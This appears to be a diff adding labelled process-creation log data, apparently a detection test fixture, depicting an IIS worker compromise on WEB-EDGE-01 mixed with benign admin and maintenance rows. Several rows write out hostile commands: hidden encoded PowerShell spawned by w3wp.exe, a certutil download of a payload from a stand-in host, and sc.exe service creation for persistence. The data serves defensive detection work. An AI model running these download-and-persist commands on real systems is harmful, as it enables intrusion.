@@ -1,0 +1,18 @@
+_time,host,user,process_name,process_id,parent_process_name,parent_process_id,command_line,session_type,signature_status,note
+2026-07-21T13:50:00Z,WEB-EDGE-01,NT AUTHORITY\\SYSTEM,w3wp.exe,4100,services.exe,760,C:\\Windows\\System32\\inetsrv\\w3wp.exe -ap DefaultAppPool,service,signed,normal IIS worker
+2026-07-21T14:00:15Z,WEB-EDGE-01,IIS APPPOOL\\DefaultAppPool,cmd.exe,7724,w3wp.exe,4100,cmd.exe /c powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <redacted>,service,signed,suspicious web worker child
+2026-07-21T14:00:16Z,WEB-EDGE-01,IIS APPPOOL\\DefaultAppPool,powershell.exe,7860,cmd.exe,7724,powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <redacted>,service,signed,suspicious hidden PowerShell
+2026-07-21T14:00:21Z,WEB-EDGE-01,IIS APPPOOL\\DefaultAppPool,certutil.exe,7904,powershell.exe,7860,certutil.exe -urlcache -split -f https://cdn-sync.example/bin/wcache.dat C:\\ProgramData\\WinCache\\wcache.exe,service,signed,stages unsigned payload
+2026-07-21T14:00:29Z,WEB-EDGE-01,IIS APPPOOL\\DefaultAppPool,wcache.exe,8032,powershell.exe,7860,C:\\ProgramData\\WinCache\\wcache.exe -install,service,unsigned,payload initial execution
+2026-07-21T14:02:02Z,WEB-EDGE-01,NT AUTHORITY\\SYSTEM,sc.exe,8468,wcache.exe,8032,sc.exe create WindowsCacheSync binPath= C:\\ProgramData\\WinCache\\wcache.exe start= auto,service,signed,malicious service creation
+2026-07-21T14:02:09Z,WEB-EDGE-01,NT AUTHORITY\\SYSTEM,sc.exe,8500,wcache.exe,8032,sc.exe start WindowsCacheSync,service,signed,malicious service start
+2026-07-21T14:02:13Z,WEB-EDGE-01,NT AUTHORITY\\SYSTEM,wcache.exe,8556,services.exe,760,C:\\ProgramData\\WinCache\\wcache.exe,service,unsigned,service-launched payload
+2026-07-21T14:05:43Z,WEB-EDGE-01,WEBLAB\\admin.jlee,powershell.exe,9208,explorer.exe,3608,powershell.exe -NoProfile -File C:\\Ops\\Collect-ServiceState.ps1,interactive,signed,admin triage
+2026-07-21T14:05:47Z,WEB-EDGE-01,WEBLAB\\admin.jlee,sc.exe,9256,powershell.exe,9208,sc.exe query WindowsCacheSync,interactive,signed,admin review
+2026-07-21T14:08:20Z,WEB-EDGE-01,NT AUTHORITY\\SYSTEM,powershell.exe,9612,taskeng.exe,1480,powershell.exe -NoProfile -File C:\\Program Files\\WebLab\\RotateLogs.ps1,scheduled,signed,routine scheduled maintenance
+2026-07-21T14:08:33Z,WEB-EDGE-01,NT AUTHORITY\\SYSTEM,robocopy.exe,9664,powershell.exe,9612,robocopy.exe C:\\inetpub\\logs \\\\BACKUP-01\\edge-web-logs /MIR,scheduled,signed,routine backup copy
+2026-07-21T14:10:15Z,APP-API-02,NT AUTHORITY\\SYSTEM,powershell.exe,5120,services.exe,744,powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\Deploy\\InstallCompanyAgent.ps1,service,signed,approved deployment
+2026-07-21T14:10:22Z,APP-API-02,NT AUTHORITY\\SYSTEM,cmd.exe,5204,powershell.exe,5120,cmd.exe /c msiexec.exe /i C:\\ProgramData\\Deploy\\company-agent.msi /qn,service,signed,deployment cmd
+2026-07-21T14:10:24Z,APP-API-02,NT AUTHORITY\\SYSTEM,msiexec.exe,5268,cmd.exe,5204,msiexec.exe /i C:\\ProgramData\\Deploy\\company-agent.msi /qn,service,signed,approved install
+2026-07-21T14:12:04Z,WEB-EDGE-02,NT AUTHORITY\\SYSTEM,powershell.exe,6020,taskeng.exe,1404,powershell.exe -NoProfile -File C:\\Program Files\\WebLab\\RotateLogs.ps1,scheduled,signed,peer scheduled maintenance
+2026-07-21T14:15:00Z,VULN-SCAN-01,scanner,nuclei,1180,bash,1000,nuclei -u https://web-edge-01.example.com -t exposures/,interactive,signed,vulnerability scanner
